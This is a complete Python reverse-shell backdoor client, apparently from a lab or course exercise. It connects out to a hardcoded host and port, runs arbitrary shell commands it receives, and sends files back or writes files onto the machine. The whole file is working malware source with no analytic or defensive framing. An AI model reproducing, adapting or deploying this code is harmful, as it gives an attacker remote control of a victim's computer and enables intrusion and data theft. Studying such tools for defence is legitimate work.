import os
import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        print("[+] Connection established")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())  # Encode the JSON string to bytes

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()  # Decode bytes to string
                return json.loads(json_data)  # Parse the JSON string
            except ValueError:
                continue  # Keep receiving if the data is incomplete

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()  # Decode bytes to string
        except subprocess.CalledProcessError:
            return "[!] Failed to execute command"

    def change_working_dir_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changed working directory to " + path
        except FileNotFoundError:
            return "[!] Directory not found: " + path

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return file.read().decode("latin1")  # Read file and convert binary to string for transmission
        except FileNotFoundError:
            return "[!] File not found: " + path
        except Exception as e:
            return f"[!] Failed to read file: {e}"

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:  # Write file in binary mode
                file.write(content.encode('latin1'))  # Convert content back to bytes
                return "[+] Upload Successful"
        except Exception as e:
            return f"[!] Failed to write file: {e}"

    def run(self):
        while True:
            command = self.reliable_receive()  # Receive command from the server

            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_dir_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":
                # Handle the file upload: command[2] contains the file content
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)  # Execute the system command

            self.reliable_send(command_result)  # Send the result back to the server

my_backdoor = Backdoor("10.0.2.21", 4444)
my_backdoor.run()
